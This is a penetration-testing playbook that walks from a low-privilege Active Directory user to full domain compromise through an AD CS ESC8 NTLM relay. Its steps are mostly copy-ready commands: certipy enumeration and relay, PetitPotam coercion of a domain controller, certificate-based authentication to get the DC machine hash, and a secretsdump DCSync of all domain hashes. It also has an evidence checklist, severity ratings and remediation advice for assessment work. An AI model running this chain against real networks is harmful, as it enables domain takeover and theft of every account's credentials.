# ESC8 → Domain Compromise Playbook

**Techniques:** AD CS ESC8 NTLM Relay, PetitPotam Coercion, PKINIT Auth, DCSync  
**MITRE:** T1557.001, T1003.006  
**Auth Required:** Low-privilege domain user  
**Tags:** #playbook #adcs #esc8 #domain-compromise #ntlm-relay

---

## Objective
Escalate from low-privilege domain user to full domain compromise via AD CS ESC8 misconfiguration — NTLM relay to HTTP web enrollment endpoint.

## Prerequisites
- Low-privilege domain credentials
- Network access to target DCs and CA server
- CA running web enrollment over HTTP without EPA
- Tools: `certipy-ad`, `PetitPotam.py`, `netexec`, `impacket` (secretsdump)
- Ports 445 and 80 available on attacker machine (stop `smbd`/`nmbd`)

---

## Steps

### Step 1 — Enumerate AD CS for ESC8
```bash
certipy find -u 'user@domain' -p 'password' -dc-ip <DC_IP> -vulnerable
```
Review output for `[!] Vulnerable to ESC8`. Note exact CA name and vulnerable template names.

### Step 2 — Confirm HTTP endpoint reachable
```bash
curl -I http://<CA-FQDN>/certsrv/
```
200 or 401 over HTTP = vulnerable surface confirmed.

### Step 3 — Start certipy relay
```bash
sudo systemctl stop smbd nmbd  # free port 445
certipy relay -target 'http://<CA-FQDN>' -template '<template-name>'
```
Verify both 445 and 80 are bound:
```bash
sudo ss -tlnp | grep -E '445|80'
```

### Step 4 — Trigger NTLM coercion with PetitPotam
```bash
python3 /opt/PetitPotam/PetitPotam.py -u 'user' -p 'password' -d 'domain' <attacker-ip> <DC-FQDN>
```
Use DC FQDN, not IP. Watch certipy relay for incoming auth + certificate issuance.

### Step 5 — Exchange certificate for NT hash
```bash
certipy auth -pfx <dc-machine>.pfx -dc-ip <DC_IP>
```
Returns DC machine account NT hash.

### Step 6 — Validate hash
```bash
nxc smb <DC_IP> -u '<DC_hostname$>' -H '<ntlm-hash>'
```
`[+]` = auth success. `Pwn3d!` = local admin (may not appear against peer DCs).

### Step 7 — DCSync (dump NTDS.DIT)
```bash
secretsdump.py 'domain/<DC_hostname$>'@<DC_IP> -hashes aad3b435b51404eeaad3b435b51404ee:<ntlm-hash> -dc-ip <DC_IP> -just-dc-ntlm -user-status
```

---

## Full One-Liner
```bash
# Not practical as a one-liner — requires relay listener running in parallel with coercion trigger
# Run Steps 3-4 in separate terminals
```

---

## Expected Output
- **Step 1:** Certipy JSON/TXT showing ESC8 flag on CA
- **Step 4:** PetitPotam: `Connected!`, `Attack worked!`; Certipy: `Got authentication from <DC>`, writes `.pfx`
- **Step 5:** NT hash for DC machine account
- **Step 6:** `[+] domain\DC$:HASH`
- **Step 7:** Full NTDS.DIT dump — every domain account hash

---

## Evidence to Capture
- [ ] Certipy `find` output showing ESC8
- [ ] PetitPotam coercion success output
- [ ] Certipy relay catching auth + writing `.pfx`
- [ ] `certipy auth` returning NT hash
- [ ] NetExec `[+]` authentication success
- [ ] Secretsdump output (redact hashes — show format + count only)

---

## Severity Assessment
| Condition | Severity |
|-----------|----------|
| HTTP web enrollment + no EPA + PetitPotam coercion available | Critical |
| HTTP web enrollment + EPA enabled but HTTP still allowed | High |
| HTTPS only + no EPA | Medium |
| HTTPS only + EPA Required | Remediated |

---

## Relay / Attack Path
```
Low-priv domain user
  → PetitPotam coerces DC (MS-EFSRPC)
    → DC authenticates back over SMB:445
      → Certipy catches on :445, relays to CA over HTTP
        → CA issues DC machine cert
          → PKINIT auth → DC NT hash
            → DCSync → all domain hashes
              → Golden ticket / persistence
              → Kerberoasting service accounts
              → Lateral movement to any system
```

---

## Remediation
| Finding | Fix |
|---------|-----|
| HTTP web enrollment enabled | Enforce HTTPS-only in IIS |
| No EPA on web enrollment | Enable EPA = `Required` in IIS + update CES `web.config` |
| NTLM allowed on DCs/CA | Disable via GPO: `Network Security: Restrict NTLM` |
| Web enrollment not needed | Remove CA Web Enrollment + CES roles entirely |
| Print Spooler on DCs | Disable Spooler service on all DCs |

---

## Related
- [[ttps/credential-access/ad-cs-esc8-relay]] — ESC8 technique detail
- [[ttps/credential-access/petitpotam]] — PetitPotam coercion
- [[ttps/credential-access/printerbug]] — PrinterBug coercion
- [[ttps/credential-access/dcsync]] — DCSync technique
